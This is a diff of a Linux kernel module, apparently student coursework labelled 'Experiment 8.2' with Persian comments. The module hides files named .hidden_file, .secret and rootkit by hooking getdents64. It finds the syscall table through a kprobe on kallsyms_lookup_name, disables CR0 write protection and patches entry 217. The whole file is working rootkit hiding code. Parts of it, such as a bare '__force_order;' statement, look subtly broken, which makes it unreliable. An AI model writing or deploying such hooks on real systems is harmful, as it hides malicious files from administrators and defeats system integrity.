@@ -4,14 +4,21 @@
 #include <linux/kallsyms.h>
 #include <linux/dirent.h>
 #include <linux/fs.h>
-#include <asm/syscall.h>
+#include <linux/kprobes.h>
+#include <linux/version.h>
+#include <asm/ptrace.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Student");
-MODULE_DESCRIPTION("Hook getdents64 to hide files - Experiment 8.2");
+MODULE_DESCRIPTION("Hook getdents64 to hide files - Experiment 8.2 - Kernel 6.1.159");
 
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+static kallsyms_lookup_name_t my_kallsyms_lookup_name = NULL;
+
+/* نوع صحیح syscall در kernel 6.1 */
 typedef long (*syscall_fn_t)(const struct pt_regs *);
-static void **sys_call_table = NULL;
+
+static unsigned long *sct_addr = NULL;
 static syscall_fn_t original_getdents64 = NULL;
 
 /* فایل‌هایی که پنهان می‌شوند */
@@ -25,179 +32,155 @@ static const char *hidden_files[] = {
 static int should_hide(const char *name)
 {
     int i;
-    if (!name) return 0;
-    
+    if (!name)
+        return 0;
     for (i = 0; hidden_files[i] != NULL; i++) {
-        if (strcmp(name, hidden_files[i]) == 0) {
+        if (strcmp(name, hidden_files[i]) == 0)
             return 1;
-        }
     }
     return 0;
 }
 
+/* تابع hook شده getdents64 */
 static long hooked_getdents64(const struct pt_regs *regs)
 {
-    int fd = regs->di;
-    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
-    unsigned int count = regs->dx;
-    
-    long ret, actual_ret;
-    struct linux_dirent64 *dirent_ker = NULL;
-    char *buffer = NULL;
-    int i = 0;
-    
-    /* فراخوانی اصلی syscall */
+    struct linux_dirent64 __user *dirent =
+        (struct linux_dirent64 __user *)regs->si;
+    long ret;
+    char *buf = NULL;
+    long offset = 0;
+    struct linux_dirent64 *d;
+
+    /* فراخوانی اصلی */
     ret = original_getdents64(regs);
-    
     if (ret <= 0)
         return ret;
-    
-    actual_ret = ret;
-    
-    /* تخصیص buffer در kernel */
-    buffer = kmalloc(ret, GFP_KERNEL);
-    if (!buffer) {
-        printk(KERN_ERR "[-] kmalloc failed\n");
+
+    /* تخصیص buffer */
+    buf = kmalloc(ret, GFP_KERNEL);
+    if (!buf)
+        return ret;
+
+    /* کپی از userspace */
+    if (copy_from_user(buf, dirent, ret)) {
+        kfree(buf);
         return ret;
     }
-    
-    /* کپی کردن داده‌ها از userspace */
-    if (copy_from_user(buffer, dirent, ret)) {
-        printk(KERN_ERR "[-] copy_from_user failed\n");
-        kfree(buffer);
-        return ret;
-    }
-    
+
     /* فیلتر کردن entries */
-    dirent_ker = (struct linux_dirent64 *)buffer;
-    
-    while (i < ret) {
-        struct linux_dirent64 *current = (struct linux_dirent64 *)(buffer + i);
-        unsigned short reclen = current->d_reclen;
-        
-        if (reclen == 0)
+    offset = 0;
+    while (offset < ret) {
+        d = (struct linux_dirent64 *)(buf + offset);
+
+        if (d->d_reclen == 0)
             break;
-        
-        /* چک کردن آیا این entry باید پنهان شود */
-        if (should_hide(current->d_name)) {
-            printk(KERN_INFO "[+] Hiding: %s\n", current->d_name);
-            
-            /* حذف این entry با تعدیل reclen entry قبلی */
-            if (i == 0) {
-                /* اگر entry اول باشد، تمام entries بعدی را shift کنید */
-                memmove(buffer + i, buffer + i + reclen, ret - i - reclen);
-                ret -= reclen;
-                actual_ret -= reclen;
-                continue;
-            } else {
-                /* اگر entry اول نباشد، reclen entry قبلی را تعدیل کنید */
-                struct linux_dirent64 *prev = (struct linux_dirent64 *)
-                    (buffer + i - ((struct linux_dirent64 *)(buffer + i - 1))->d_reclen);
-                prev->d_reclen += reclen;
-                ret -= reclen;
-                actual_ret -= reclen;
-                continue;
-            }
+
+        if (should_hide(d->d_name)) {
+            printk(KERN_INFO "[+] Hiding: %s\n", d->d_name);
+
+            /* حذف این entry */
+            long remaining = ret - offset - d->d_reclen;
+            if (remaining > 0)
+                memmove(buf + offset, buf + offset + d->d_reclen, remaining);
+            ret -= d->d_reclen;
+            /* offset همان‌جا بماند تا entry بعدی چک شود */
+            continue;
         }
-        
-        i += reclen;
+        offset += d->d_reclen;
     }
-    
-    /* کپی کردن داده‌های تعدیل شده به userspace */
-    if (copy_to_user(dirent, buffer, ret)) {
-        printk(KERN_ERR "[-] copy_to_user failed\n");
-        kfree(buffer);
-        return actual_ret;
+
+    /* برگرداندن نتیجه فیلتر شده */
+    if (copy_to_user(dirent, buf, ret)) {
+        kfree(buf);
+        return ret;
     }
-    
-    kfree(buffer);
-    
-    /* بازگرداندن اندازه تعدیل شده */
+
+    kfree(buf);
     return ret;
 }
 
-static unsigned long get_syscall_table_addr(void)
+/* پیدا کردن kallsyms_lookup_name با kprobes */
+static int find_kallsyms_lookup_name(void)
 {
-    unsigned long addr = kallsyms_lookup_name("sys_call_table");
-    if (!addr) {
-        printk(KERN_ERR "[-] Could not find sys_call_table\n");
-        return 0;
+    struct kprobe kp = {
+        .symbol_name = "kallsyms_lookup_name"
+    };
+    int ret;
+
+    ret = register_kprobe(&kp);
+    if (ret < 0) {
+        printk(KERN_ERR "[-] register_kprobe failed: %d\n", ret);
+        return ret;
     }
-    return addr;
+
+    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
+    unregister_kprobe(&kp);
+    return 0;
 }
 
-/* غیرفعال کردن Write Protection (CR0 bit 16) */
-static inline void disable_wp(void)
+/* غیرفعال کردن Write Protection */
+static inline void cr0_wp_off(void)
 {
-    unsigned long cr0;
-    cr0 = read_cr0();
-    write_cr0(cr0 & ~X86_CR0_WP);
-    printk(KERN_INFO "[+] Write protection disabled\n");
+    unsigned long cr0 = read_cr0();
+    clear_bit(X86_CR0_WP_BIT, &cr0);
+    __force_order;
+    asm volatile("mov %0,%%cr0" : "+r"(cr0) : : "memory");
 }
 
 /* فعال کردن Write Protection */
-static inline void enable_wp(void)
+static inline void cr0_wp_on(void)
 {
-    unsigned long cr0;
-    cr0 = read_cr0();
-    write_cr0(cr0 | X86_CR0_WP);
-    printk(KERN_INFO "[+] Write protection enabled\n");
+    unsigned long cr0 = read_cr0();
+    set_bit(X86_CR0_WP_BIT, &cr0);
+    __force_order;
+    asm volatile("mov %0,%%cr0" : "+r"(cr0) : : "memory");
 }
 
 static int __init hook_init(void)
 {
-    unsigned long table_addr;
-    syscall_fn_t *syscall_ptr;
-    
-    printk(KERN_INFO "[+] Experiment 8.2: Hook Module Loading...\n");
-    
-    /* یافتن جدول syscall */
-    table_addr = get_syscall_table_addr();
-    if (!table_addr) {
+    int ret;
+
+    printk(KERN_INFO "[+] Experiment 8.2: Loading...\n");
+
+    /* پیدا کردن kallsyms */
+    ret = find_kallsyms_lookup_name();
+    if (ret < 0)
+        return ret;
+
+    /* پیدا کردن sys_call_table */
+    sct_addr = (unsigned long *)my_kallsyms_lookup_name("sys_call_table");
+    if (!sct_addr) {
+        printk(KERN_ERR "[-] sys_call_table not found\n");
         return -EFAULT;
     }
-    
-    sys_call_table = (void **)table_addr;
-    printk(KERN_INFO "[+] sys_call_table at: 0x%lx\n", table_addr);
-    
-    /* getdents64 - syscall شماره 217 روی x86_64 */
-    original_getdents64 = (syscall_fn_t)sys_call_table[217];
-    printk(KERN_INFO "[+] Original getdents64 at: 0x%lx\n", 
+    printk(KERN_INFO "[+] sys_call_table at: 0x%lx\n",
+           (unsigned long)sct_addr);
+
+    /* ذخیره آدرس اصلی getdents64 (شماره 217) */
+    original_getdents64 = (syscall_fn_t)sct_addr[217];
+    printk(KERN_INFO "[+] Original getdents64: 0x%lx\n",
            (unsigned long)original_getdents64);
-    
-    /* Hook کردن syscall */
-    disable_wp();
-    
-    syscall_ptr = (syscall_fn_t *)&sys_call_table[217];
-    *syscall_ptr = hooked_getdents64;
-    
-    enable_wp();
-    
-    printk(KERN_INFO "[+] getdents64 hooked successfully\n");
-    printk(KERN_INFO "[+] Hidden files: .hidden_file, .secret, rootkit\n");
-    
+
+    /* Hook کردن */
+    cr0_wp_off();
+    sct_addr[217] = (unsigned long)hooked_getdents64;
+    cr0_wp_on();
+
+    printk(KERN_INFO "[+] getdents64 hooked!\n");
+    printk(KERN_INFO "[+] Hidden: .hidden_file, .secret, rootkit\n");
+
     return 0;
 }
 
 static void __exit hook_exit(void)
 {
-    syscall_fn_t *syscall_ptr;
-    
-    if (!sys_call_table || !original_getdents64) {
-        printk(KERN_ERR "[-] Module not properly initialized\n");
-        return;
+    if (sct_addr && original_getdents64) {
+        cr0_wp_off();
+        sct_addr[217] = (unsigned long)original_getdents64;
+        cr0_wp_on();
+        printk(KERN_INFO "[+] getdents64 restored\n");
     }
-    
-    printk(KERN_INFO "[-] Restoring original getdents64...\n");
-    
-    disable_wp();
-    
-    syscall_ptr = (syscall_fn_t *)&sys_call_table[217];
-    *syscall_ptr = original_getdents64;
-    
-    enable_wp();
-    
-    printk(KERN_INFO "[-] Experiment 8.2: Hook Module Unloaded\n");
+    printk(KERN_INFO "[-] Experiment 8.2: Unloaded\n");
 }
 
 module_init(hook_init);
